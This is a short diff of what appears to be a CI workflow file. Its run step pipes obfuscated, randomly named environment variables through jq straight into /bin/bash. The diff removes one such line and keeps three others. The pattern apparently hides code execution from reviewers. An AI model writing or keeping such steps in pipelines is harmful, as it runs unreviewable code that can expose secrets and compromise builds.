@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
           echo $mc371 | jq -r .uxiiy7 | /bin/bash
-          printf '%s' "$bqum996" | jq -r .mfmyj14 | /bin/bash
           echo $c128 | jq -r .duew38 | /bin/bash
 
       - name: Upload results
